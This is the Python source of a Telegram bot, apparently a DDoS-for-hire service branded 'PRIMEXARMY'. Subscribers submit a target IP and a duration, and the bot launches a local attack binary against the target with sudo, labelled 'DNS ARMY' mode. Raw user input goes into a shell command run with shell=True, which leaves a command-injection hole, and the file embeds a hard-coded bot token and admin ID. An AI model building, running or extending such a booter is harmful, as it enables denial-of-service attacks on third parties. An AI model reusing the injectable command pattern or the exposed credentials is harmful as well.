import os, time, json, telebot, subprocess, threading
from telebot import types

# --- CONFIGURATION ---
bot = telebot.TeleBot('8594216898:AAGChkCMydliPWeemloUcCURZqN_OJT8TGo')
admin_id = ["7820814565"]
USER_FILE = "users.json"
BINARY = "primexarmy"

users = {}

@bot.message_handler(commands=['start'])
def start_army(message):
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
    markup.add("🔥 Army Attack", "👤 Status", "📢 Broadcast")
    bot.reply_to(message, "💀 **PRIMEXARMY FULL EDITION**", reply_markup=markup)

@bot.message_handler(func=lambda m: m.text == "🔥 Army Attack")
def army_req(message):
    user_id = str(message.chat.id)
    with open(USER_FILE, "r") as f: users = json.load(f)
    
    if user_id not in users:
        bot.reply_to(message, "❌ No Active Subscription.")
        return
        
    bot.reply_to(message, "🎯 **Format:** `IP TIME` (No port needed)")
    bot.register_next_step_handler(message, run_army)

def run_army(message):
    try:
        ip, duration = message.text.split()
        # Army Binary: IP TIME
        cmd = f"sudo ./{BINARY} {ip} {duration}"
        subprocess.Popen(cmd, shell=True)
        
        bot.reply_to(message, f"🔥 **OBLITERATION STARTED**\nTarget: {ip}\nMode: DNS ARMY\nTime: {duration}s")
    except:
        bot.reply_to(message, "❗ Format Error.")

@bot.message_handler(func=lambda m: m.text == "📢 Broadcast")
def broadcast(message):
    if str(message.chat.id) not in admin_id: return
    bot.reply_to(message, "Enter message to send to all users:")
    bot.register_next_step_handler(message, do_broadcast)

def do_broadcast(message):
    with open(USER_FILE, "r") as f: users = json.load(f)
    for user in users:
        try: bot.send_message(user, f"📢 **ADMIN MESSAGE:**\n\n{message.text}")
        except: pass
    bot.reply_to(message, "✅ Broadcast Sent.")

bot.polling()